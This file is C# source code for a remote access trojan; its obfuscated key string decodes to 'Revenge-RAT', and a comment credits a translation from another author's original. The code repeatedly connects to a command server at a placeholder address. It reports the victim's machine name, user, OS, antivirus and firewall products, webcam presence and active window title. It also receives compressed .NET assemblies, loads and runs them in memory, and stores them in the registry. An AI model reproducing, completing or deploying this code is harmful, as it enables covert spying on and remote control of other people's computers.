﻿using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System.Windows.Forms;
namespace DrHazemBasharBachir
{ //Original Source Made By Dr.Hazem Translated To C# By Bashar Bachir
    public class Atomic
    {
        public static string App = Application.ExecutablePath;
        public static ComputerInfo Di = new ComputerInfo();
        public static string Key = new string(new []{ (char)82, (char)101, (char)118, (char)101, (char)110, (char)103, (char)101, (char)45, (char)82, (char)65, (char)84, });
        public static Atomic Scg = new Atomic();
        public static string Spl = new string(new []{ (char)42, (char)45, (char)93, (char)78, (char)75, (char)91, (char)45, (char)42});
        public byte[] B;
        public TcpClient C;
        public NetworkStream Nt;
        public MemoryStream M;
        public Thread Ping;
        public Thread Sk;
        public Thread Dt;
        public int H;
        public string[] Hosts;
        public int I;
        public string Id;
        public int Ms;
        public static Mutex Mt;
        public string Mutex;
        public bool Ow;
        public int P;
        public string[] Ports;
        public object Sc;

        public Atomic()
        {
            Ow = false;
        }

        public void Finly()
        {
            var num1 = 0;
            var num2 = 0;
            try
            {
                ProjectData.ClearProjectError();
                num1 = 2;
                new Thread(Ins).Start();
                I = 1;
                Ms = 0;
                Hosts = Strings.Split("127.0.0.1,", ",");
                Ports = Strings.Split("333,", ",");
                Id = new string(new []{ (char)82, (char)51, (char)86, (char)108, (char)99, (char)51, (char)81, (char)61});
                Mutex = new string(new []{ (char)82, (char)86, (char)95, (char)77, (char)85, (char)84, (char)69, (char)88});
                H = 0;
                P = 0;
                Information.Err().Clear();
                goto label_8;
            }
            catch (Exception ex) when (true & (uint)num1 > 0U & num2 == 0)
            {
                ProjectData.SetProjectError(ex);
            }
            throw ProjectData.CreateProjectError(-2146828237);
            label_8:
            if (num2 == 0)
                return;
            ProjectData.ClearProjectError();
        }

        public void Rc()
        {
            M = new MemoryStream();
            while (true)
            {
                var num = 1;
                C = new TcpClient();
                if (!C.Connected)
                {
                    try
                    {
                        C.ReceiveBufferSize = 9000000;
                        C.SendBufferSize = 9000000;
                        C.ReceiveTimeout = -1;
                        C.SendTimeout = -1;
                        C.Connect(Hosts[0], Conversions.ToInteger(Ports[0]));
                    }
                    catch (Exception ex)
                    {
                        var lErl = num;
                        ProjectData.SetProjectError(ex, lErl);
                        C = null;
                        Thread.Sleep(4000);
                        ProjectData.ClearProjectError();
                        continue;
                    }
                    if (C.Connected)
                        NewLateBinding.LateCall(this, null, "Send", new[]
                        {
              Info()
            }, null, null, null, true);
                }
                try
                {
                    Ping = new Thread(Pin);
                    Ping.Start();
                }
                catch (Exception ex)
                {
                    var lErl = num;
                    ProjectData.SetProjectError(ex, lErl);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    try
                    {
                        while (!C.Client.Poll(1000, SelectMode.SelectRead) || C.Available != 0)
                        {
                            if (C.Available > 0)
                            {
                                Nt = C.GetStream();
                                B = new byte[checked(C.Available - 1 + 1)];
                                M.Write(B, 0, Nt.Read(B, 0, B.Length));
                                if (Gs(M.ToArray()).Contains(Spl))
                                {
                                    Dt = new Thread(a0 => Data((byte[])a0), 1);
                                    Dt.Start(Sp(M.ToArray()));
                                    M.Dispose();
                                    M = new MemoryStream();
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        var lErl = num;
                        ProjectData.SetProjectError(ex, lErl);
                        ProjectData.ClearProjectError();
                    }
                }
                catch (Exception ex)
                {
                    var lErl = num;
                    ProjectData.SetProjectError(ex, lErl);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    M.Dispose();
                    M = new MemoryStream();
                }
                catch (Exception ex)
                {
                    var lErl = num;
                    ProjectData.SetProjectError(ex, lErl);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    C.Close();
                }
                catch (Exception ex)
                {
                    var lErl = num;
                    ProjectData.SetProjectError(ex, lErl);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    C = null;
                }
                catch (Exception ex)
                {
                    var lErl = num;
                    ProjectData.SetProjectError(ex, lErl);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    Ping.Abort();
                }
                catch (Exception ex)
                {
                    var lErl = num;
                    ProjectData.SetProjectError(ex, lErl);
                    ProjectData.ClearProjectError();
                }
            }
            // ReSharper disable once FunctionNeverReturns
        }

        public byte[] Sp(byte[] b)
        {
            var num1 = 0;
            byte[] numArray;
            var num2 = 0;
            try
            {
                ProjectData.ClearProjectError();
                num1 = 2;
                numArray = Gb(Gs(b).Split(Conversions.ToChar(Spl))[0]);
                goto label_7;
            }
            catch (Exception ex) when (true & (uint)num1 > 0U & num2 == 0)
            {
                ProjectData.SetProjectError(ex);
            }
            throw ProjectData.CreateProjectError(-2146828237);
            label_7:
            if (num2 != 0)
                ProjectData.ClearProjectError();
            return numArray;
        }

        public void Send(byte[] b)
        {
            var num1 = 0;
            var num2 = 0;
            try
            {
                ProjectData.ClearProjectError();
                num1 = 2;
                Nt = C.GetStream();
                if (Nt.CanWrite)
                {
                    C.Client.Poll(-1, SelectMode.SelectWrite);
                    foreach (Match match in Regex.Matches(Gs(b), ".{1," + Convert.ToString(1024) + "}"))
                        Nt.Write(Gb(match.Value), 0, Strings.Len(match.Value));
                    Nt.Write(Gb(Spl), 0, Spl.Length);
                }
                Nt.Flush();
                Information.Err().Clear();
                goto label_15;
            }
            catch (Exception ex) when (true & (uint)num1 > 0U & num2 == 0)
            {
                ProjectData.SetProjectError(ex);
            }
            throw ProjectData.CreateProjectError(-2146828237);
            label_15:
            if (num2 == 0)
                return;
            ProjectData.ClearProjectError();
        }

        public void Send(string s)
        {
            Send(Gb(s));
        }

        public string Gs(byte[] b)
        {
            return Encoding.Default.GetString(b);
        }

        public byte[] Gb(string s)
        {
            return Encoding.Default.GetBytes(s);
        }

        public string Civc()
        {
            try
            {
                var num1 = 0;
                do
                {
                    string lpszVer = null;
                    int num2 = checked((short)num1);
                    var lpszName = Strings.Space(100);
                    var cbName = 100;
                    var cbVer = 100;
                    if (!capGetDriverDescriptionA((short)num2, ref lpszName, cbName, ref lpszVer, cbVer))
                        checked { ++num1; }
                    else
                        goto label_4;
                }
                while (num1 <= 4);
                goto label_6;
                label_4:
                return "Yes";
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
            }
            label_6:
            return "No";
        }

        public void Data(byte[] b)
        {
            try
            {
                var strArray1 = Strings.Split(Gs(b), Key);
                if (Operators.CompareString(strArray1[0], "PNC", false) == 0)
                {
                    I = 0;
                    Send("PNC");
                }
                else if (Operators.CompareString(strArray1[0], "P", false) == 0)
                {
                    I = 1;
                    Send("P" + Key + Conversions.ToString(Ms));
                    Ms = 0;
                    Send("W" + Key + Gaw());
                }
                else if (Operators.CompareString(strArray1[0], "IE", false) == 0)
                {
                    if (Registry.CurrentUser.OpenSubKey(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("Software\\", RuntimeHelpers.GetObjectValue(Encode(Mutex)))), "\\")), strArray1[1]))), true) != null)
                    {
                        try
                        {
                            Inv(Hosts[H], Ports[P], strArray1[4], strArray1[5], Conversions.ToString(RuntimeHelpers.GetObjectValue(Encode(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Decode(Id)), "_")), Hwd())))))), Registry.GetValue(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("HKEY_CURRENT_USER\\SOFTWARE\\", RuntimeHelpers.GetObjectValue(Encode(Mutex)))), "\\")), strArray1[1]))), strArray1[1], null).ToString(), Conversions.ToInteger(strArray1[2]), Conversions.ToBoolean(strArray1[3]), strArray1[1], true);
                        }
                        catch (Exception ex)
                        {
                            ProjectData.SetProjectError(ex);
                            ProjectData.SetProjectError(ex);
                            Send("GPL" + Key + strArray1[5] + Key + strArray1[1] + Key + Conversions.ToString(false));
                            ProjectData.ClearProjectError();
                            ProjectData.ClearProjectError();
                        }
                    }
                    else
                        Send("GPL" + Key + strArray1[5] + Key + strArray1[1] + Key + Conversions.ToString(false));
                }
                else if (Operators.CompareString(strArray1[0], "LP", false) == 0)
                    Inv(Hosts[H], Ports[P], strArray1[1], strArray1[2], Conversions.ToString(RuntimeHelpers.GetObjectValue(Encode(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Decode(Id)), "_")), Hwd())))))), strArray1[3], Conversions.ToInteger(strArray1[4]), Conversions.ToBoolean(strArray1[5]), strArray1[6], Conversions.ToBoolean(strArray1[7]));
                else if (Operators.CompareString(strArray1[0], "UNV", false) == 0)
                {
                    var objectValue1 = RuntimeHelpers.GetObjectValue(La(strArray1[1]));
                    var MemberName1 = "CreateInstance";
                    var arguments1 = new object[1];
                    var index1 = 0;
                    var strArray2 = strArray1;
                    var index2 = 2;
                    arguments1[index1] = strArray2[index2];
                    var objArray1 = arguments1;
                    var copyBack1 = new[] { true };
                    var flagArray1 = copyBack1;
                    var objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue1), null, MemberName1, arguments1, null, null, copyBack1));
                    if (flagArray1[0])
                        strArray2[index2] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray1[0])), typeof(string)));
                    var objectValue3 = RuntimeHelpers.GetObjectValue(objectValue2);
                    var MemberName2 = "UNI";
                    var arguments2 = new object[43];
                    arguments2[0] = RuntimeHelpers.GetObjectValue(Encode(Mutex));
                    var index3 = 1;
                    var strArray3 = strArray1;
                    var index4 = 3;
                    arguments2[index3] = strArray3[index4];
                    arguments2[2] = "";
                    arguments2[3] = "";
                    arguments2[4] = "";
                    arguments2[5] = "";
                    arguments2[6] = "";
                    arguments2[7] = "";
                    arguments2[8] = "";
                    arguments2[9] = "";
                    arguments2[10] = "";
                    arguments2[11] = "";
                    arguments2[12] = "";
                    arguments2[13] = "";
                    arguments2[14] = "";
                    arguments2[15] = "";
                    arguments2[16] = "";
                    arguments2[17] = "";
                    arguments2[18] = "";
                    arguments2[19] = "";
                    arguments2[20] = "";
                    arguments2[21] = "";
                    arguments2[22] = "";
                    arguments2[23] = "";
                    arguments2[24] = "";
                    arguments2[25] = "";
                    arguments2[26] = "";
                    var index5 = 32;
                    var strArray4 = strArray1;
                    var index6 = 4;
                    arguments2[index5] = strArray4[index6];
                    var index7 = 33;
                    var strArray5 = strArray1;
                    var index8 = 5;
                    arguments2[index7] = strArray5[index8];
                    arguments2[34] = App;
                    var index9 = 35;
                    var strArray6 = strArray1;
                    var index10 = 6;
                    arguments2[index9] = strArray6[index10];
                    var index11 = 36;
                    var strArray7 = strArray1;
                    var index12 = 7;
                    arguments2[index11] = strArray7[index12];
                    var index13 = 37;
                    var strArray8 = strArray1;
                    var index14 = 8;
                    arguments2[index13] = strArray8[index14];
                    var index15 = 38;
                    var strArray9 = strArray1;
                    var index16 = 9;
                    arguments2[index15] = strArray9[index16];
                    var index17 = 39;
                    var strArray10 = strArray1;
                    var index18 = 10;
                    arguments2[index17] = strArray10[index18];
                    var index19 = 40;
                    var strArray11 = strArray1;
                    var index20 = 11;
                    arguments2[index19] = strArray11[index20];
                    var index21 = 41;
                    var strArray12 = strArray1;
                    var index22 = 12;
                    arguments2[index21] = strArray12[index22];
                    var index23 = 42;
                    var strArray13 = strArray1;
                    var index24 = 13;
                    arguments2[index23] = strArray13[index24];
                    var objArray2 = arguments2;
                    var copyBack2 = new[]
                  {
            false,
            true,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            false,
            true,
            true,
            true,
            true,
            true,
            true,
            true,
            true,
            true,
            true,
            true
          };
                    var flagArray2 = copyBack2;
                    NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue3), null, MemberName2, arguments2, null, null, copyBack2, true);
                    if (flagArray2[1])
                        strArray3[index4] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[1])), typeof(string)));
                    if (flagArray2[32])
                        strArray4[index6] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[32])), typeof(string)));
                    if (flagArray2[33])
                        strArray5[index8] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[33])), typeof(string)));
                    if (flagArray2[34])
                        App = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[34])), typeof(string)));
                    if (flagArray2[35])
                        strArray6[index10] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[35])), typeof(string)));
                    if (flagArray2[36])
                        strArray7[index12] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[36])), typeof(string)));
                    if (flagArray2[37])
                        strArray8[index14] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[37])), typeof(string)));
                    if (flagArray2[38])
                        strArray9[index16] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[38])), typeof(string)));
                    if (flagArray2[39])
                        strArray10[index18] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[39])), typeof(string)));
                    if (flagArray2[40])
                        strArray11[index20] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[40])), typeof(string)));
                    if (flagArray2[41])
                        strArray12[index22] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[41])), typeof(string)));
                    if (flagArray2[42])
                        strArray13[index24] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[42])), typeof(string)));
                }
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
            }
        }

        public object Decode(string input)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(input));
        }

        public byte[] Decompress(byte[] data)
        {
            var memoryStream1 = new MemoryStream();
            memoryStream1.Write(data, 0, data.Length);
            memoryStream1.Position = 0L;
            var gzipStream = new GZipStream(memoryStream1, CompressionMode.Decompress, true);
            var memoryStream2 = new MemoryStream();
            var numArray = new byte[64];
            for (var count = gzipStream.Read(numArray, 0, numArray.Length); count > 0; count = gzipStream.Read(numArray, 0, numArray.Length))
                memoryStream2.Write(numArray, 0, count);
            gzipStream.Close();
            return memoryStream2.ToArray();
        }

        public object Encode(string input)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(input));
        }

        public string Gaw()
        {
            var lpString = new StringBuilder(256);
            GetWindowText(GetForegroundWindow(), lpString, lpString.Capacity);
            return Conversions.ToString(RuntimeHelpers.GetObjectValue(Encode(lpString.ToString())));
        }

        public string GetProduct(string product)
        {
            string str;
            try
            {
                var empty = string.Empty;
                var enumerator = new ManagementObjectSearcher("root\\SecurityCenter" + Interaction.IIf(Di.OSFullName.Contains("XP"), "", "2"), product).Get().GetEnumerator();
                while (enumerator.MoveNext())
                {
                    var current = (ManagementObject)enumerator.Current;
                    empty += current["displayName"].ToString();
                }

                str = (uint)Operators.CompareString(empty, string.Empty, false) <= 0U ? Conversions.ToString(RuntimeHelpers.GetObjectValue(Encode("N/A"))) : Conversions.ToString(RuntimeHelpers.GetObjectValue(Encode(empty)));
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                str = Conversions.ToString(RuntimeHelpers.GetObjectValue(Encode("N/A")));
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
            }
            return str;
        }

        [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

        [DllImport("psapi")]
        public static extern bool EmptyWorkingSet(long hProcess);

        [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern void GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string ip, [MarshalAs(UnmanagedType.VBByRefStr)] ref string v, int T, ref int h, ref int q, ref int g, [MarshalAs(UnmanagedType.VBByRefStr)] ref string j, int x);

        [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern void GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

        public string Hwd()
        {
            string str;
            try
            {
                string v = null;
                var q = 0;
                var g = 0;
                string j = null;
                var ip = Interaction.Environ("SystemDrive") + "\\";
                int h = 0;
                GetVolumeInformationA(ref ip, ref v, 0, ref h, ref q, ref g, ref j, 0);
                str = Conversion.Hex(h);
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                str = "ERR";
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
            }
            return str;
        }

        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        public void Ins()
        {
            try
            {
                Mt = new Mutex(true, Mutex, out Ow);
                if (!Ow)
                {
                    ProjectData.EndApp();
                    Application.ApplicationExit += null;
                }
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
            }
            Thread.Sleep(35000);
        }

        public object Inv(string h, string p, string N, string c, string id, string bytes, int s, bool m, string md5, bool B)
        {
            var objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(La(bytes)), null, "CreateInstance", new object[]
            {
        N + "." + c,
        true
            }, null, null, null));
            var MemberName = "Start";
            var arguments = new object[]
            {
        id,
        s,
        h,
        p,
        Key,
        Spl
            };
            var objArray = arguments;
            var copyBack = new[]
          {
        true,
        true,
        true,
        true,
        true,
        true
      };
            var flagArray = copyBack;
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), null, MemberName, arguments, null, null, copyBack, true);
            if (flagArray[0])
                id = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray[0])), typeof(string)));
            if (flagArray[1])
                s = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray[1])), typeof(int)));
            if (flagArray[2])
                h = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray[2])), typeof(string)));
            if (flagArray[3])
                p = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray[3])), typeof(string)));
            if (flagArray[4])
                Key = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray[4])), typeof(string)));
            if (flagArray[5])
                Spl = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray[5])), typeof(string)));
            if (m)
            {
                try
                {
                    if (Registry.CurrentUser.OpenSubKey(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("Software\\", RuntimeHelpers.GetObjectValue(Encode(Mutex)))), "\\")), md5))), true) == null)
                        Ir(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("HKEY_CURRENT_USER\\SOFTWARE\\", RuntimeHelpers.GetObjectValue(Encode(Mutex)))), "\\")), md5))), md5, bytes);
                }
                catch (Exception ex)
                {
                    ProjectData.SetProjectError(ex);
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                    ProjectData.ClearProjectError();
                }
                if (!B)
                    Ir(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("HKEY_CURRENT_USER\\SOFTWARE\\", RuntimeHelpers.GetObjectValue(Encode(Mutex)))), "\\")), md5))), md5, bytes);
            }
            object obj = null;
            return obj;
        }

        public object Ip()
        {
            object obj;
            try
            {
                obj = ((IPAddress)new IPHostEntry( /* can't present value of type System.Net.IPHostEntry */).AddressList.GetValue(0)).ToString();
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                obj = "????";
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
            }
            return obj;
        }

        public object Ir(string P, string N, string B)
        {
            try
            {
                Registry.SetValue(P, N, B);
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
            }

            return null;
        }

        public object La(string B)
        {
            return Assembly.Load(Decompress(Convert.FromBase64String(B)));
        }

        public object Info()
        {
            return "Information" + Key + Id + Key + Encode("_" + Hwd()) + Key + Ip() + Key + Encode(Environment.MachineName + " / " + Environment.UserName) + Key + Civc() + Key + Encode(Di.OSFullName + " " + Op()) + Key + Encode(Conversions.ToString(RuntimeHelpers.GetObjectValue(Mp()))) + Key + Di.TotalPhysicalMemory + Key + GetProduct("Select * from AntiVirusProduct") + Key + GetProduct("SELECT * FROM FirewallProduct") + Key + Ports[P] + Key + Gaw() + Key + Encode(CultureInfo.CurrentCulture.Name);
        }

        public object Mp()
        {
            object obj;
            try
            {
                obj = Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CENTRALPROCESSOR\\0", "ProcessorNameString", null).ToString();
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                obj = "????";
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
            }
            return obj;
        }

        public static string Op()
        {
            string str = null;
            try
            {
                ManagementObjectCollection.ManagementObjectEnumerator enumerator = null;
                try
                {
                    enumerator = new ManagementObjectSearcher("select * from Win32_Processor").Get().GetEnumerator();
                    if (enumerator.MoveNext())
                        return Conversions.ToString(Convert.ToInt32(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator.Current["AddressWidth"]))));
                }
                finally
                {
                    enumerator?.Dispose();
                }
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                str = "????";
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
            }
            return str;
        }

        public void Pin()
        {
            try
            {
                while (true)
                {
                    if (I == 0)
                    {

                    }
                    Thread.Sleep(500);
                }
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
            }
        }
    }
    public class DrHazem
    {
        [STAThread]
        public static void Main()
        {
            var atomic = new Atomic();
            atomic.Finly();
            while (true)
            {
                Thread.Sleep(20000);
                atomic.Sk = new Thread(atomic.Rc);
                atomic.Sk.Start();
                Thread.Sleep(1800000);
                atomic.Sk.Abort();
                atomic.Dt.Abort();
            }
            // ReSharper disable once FunctionNeverReturns
        }
    }
}
